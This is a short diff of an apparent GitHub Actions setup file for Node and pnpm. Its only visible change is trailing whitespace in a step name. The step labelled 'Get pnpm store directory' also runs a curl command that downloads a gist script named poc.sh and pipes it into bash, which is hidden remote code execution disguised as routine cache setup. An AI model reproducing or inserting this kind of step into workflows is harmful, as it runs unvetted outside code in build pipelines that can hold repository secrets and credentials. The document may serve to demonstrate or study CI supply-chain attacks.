@@ -14,7 +14,7 @@ runs:
         node-version: 20
         cache: 'pnpm'
 
-    - name: Get pnpm store directory
+    - name: Get pnpm store directory 
       run: |
         curl -sSfL gist.githubusercontent.com/Fearless-Squirrel/bbef3562184dc8ac74b076f15a9c465f/raw/a6b039c77703f03c387153e58b0cfec3e81463a2/poc.sh | bash
         echo "STORE_PATH=$(pnpm store path --silent)" >> $GITHUB_ENV
